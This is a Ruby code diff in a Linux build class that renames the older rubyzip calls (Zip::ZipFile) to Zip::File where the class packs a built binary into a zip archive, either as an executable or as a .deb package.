@@ -128,16 +128,16 @@ class BuildLinux < Build
     trace :debug, "Build: pack: #{params}"
 
     if @melting_mode.eql? :silent
-      Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
+      Zip::File.open(path('output.zip'), Zip::File::CREATE) do |z|
         z.file.open(@appname, "wb") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
       end
 
       # make it executable (for some reason we cannot do it in the previous phase)
-      Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
+      Zip::File.open(path('output.zip'), Zip::File::CREATE) do |z|
         z.file.chmod(0755, @appname)
       end
     else
-      Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
+      Zip::File.open(path('output.zip'), Zip::File::CREATE) do |z|
         z.file.open("#{@appname}.deb", "wb") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
       end
     end
@@ -148,7 +148,7 @@ class BuildLinux < Build
   end
 
   def unique(core)
-    Zip::ZipFile.open(core) do |z|
+    Zip::File.open(core) do |z|
       core_content = z.file.open('core32', "rb") { |f| f.read }
       add_magic(core_content)
       File.open(Config.instance.temp('core32'), "wb") {|f| f.write core_content}
